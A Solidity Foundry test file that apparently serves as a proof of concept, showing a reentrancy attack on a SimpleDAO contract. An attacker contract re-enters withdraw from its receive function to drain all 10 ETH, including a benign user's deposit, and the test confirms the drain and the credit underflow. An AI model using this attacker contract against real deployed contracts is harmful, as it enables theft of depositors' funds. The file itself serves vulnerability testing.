// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/simple_dao.sol";

contract ReenteringAttacker {
    SimpleDAO public immutable dao;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    
    constructor(SimpleDAO _dao) {
        dao = _dao;
    }
    
    function startAttack() public {
        // Start initial withdrawal
        dao.withdraw(ATTACK_AMOUNT);
    }
    
    // Function to receive Ether and re-enter
    receive() external payable {
        while (address(dao).balance >= ATTACK_AMOUNT) {
            // Repeatedly withdraw before state update
            dao.withdraw(ATTACK_AMOUNT);
        }
    }
}

contract SimpleDAOReentrancyTest is Test {
    SimpleDAO dao;
    ReenteringAttacker attacker;
    address constant BENIGN_USER = address(0x123);
    
    function setUp() public {
        // Deploy contracts and setup initial state
        dao = new SimpleDAO();
        attacker = new ReenteringAttacker(dao);
        
        // Fund test contract for donations
        vm.deal(address(this), 10 ether);
        
        // Setup attacker's initial credit (1 ETH)
        dao.donate{value: 1 ether}(address(attacker));
        
        // Setup benign user's credit (9 ETH)
        dao.donate{value: 9 ether}(BENIGN_USER);
    }

    function test_reentrancyDrain() public {
        // Pre-attack State Setup
        uint256 daoBalanceBefore = address(dao).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerCreditBefore = dao.queryCredit(address(attacker));
        
        console.log("--- BEFORE-Trigger State ---");
        console.log("DAO balance:         %s", daoBalanceBefore);
        console.log("Attacker balance:    %s", attackerBalanceBefore);
        console.log("Attacker credit:     %s", attackerCreditBefore);
        
        console.log("--- Trigger Attack (attacker.startAttack()) ---");
        // Start reentrancy attack
        attacker.startAttack();
        
        // Post-attack State Capture
        uint256 daoBalanceAfter = address(dao).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerCreditAfter = dao.queryCredit(address(attacker));
        
        console.log("--- AFTER-Trigger State ---");
        console.log("DAO balance:         %s", daoBalanceAfter);
        console.log("Attacker balance:    %s", attackerBalanceAfter);
        console.log("Attacker credit:     %s", attackerCreditAfter);

        // Differential Validation
        uint256 daoBalanceDiff = daoBalanceBefore - daoBalanceAfter;
        uint256 attackerBalanceDiff = attackerBalanceAfter - attackerBalanceBefore;
        uint256 attackerCreditDiff = attackerCreditAfter > attackerCreditBefore 
            ? attackerCreditAfter - attackerCreditBefore
            : attackerCreditBefore - attackerCreditAfter;
        
        bool attackBalancesChanged = (daoBalanceDiff == 10 ether) && 
                                    (attackerBalanceDiff == 10 ether);
        bool creditUnderflowed = attackerCreditAfter > type(uint256).max / 2;
        
        console.log("--- Differential Results ---");
        console.log("DAO balance reduction:   %s (expected: 10 ether)", daoBalanceDiff);
        console.log("Attacker balance gain:   %s (expected: 10 ether)", attackerBalanceDiff);
        console.log("Attacker credit change:  %s (check underflow)", attackerCreditDiff);
        console.log("Credit underflow state:  %s", creditUnderflowed ? "Y" : "N");
        
        // Vulnerability detection logic
        bool vulnerabilityExploited = attackBalancesChanged && creditUnderflowed;
        
        // Final verdict based on state changes
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained all funds");
        } else {
            console.log("Vulnerability not Exist: Attacker failed to exploit reentrancy vulnerability");
        }
        
        // Original test assertions preserved
        assertEq(daoBalanceAfter, 0, "DAO should be fully drained");
        assertEq(attackerBalanceAfter, 10 ether, "Attacker should have stolen all funds");
    }
}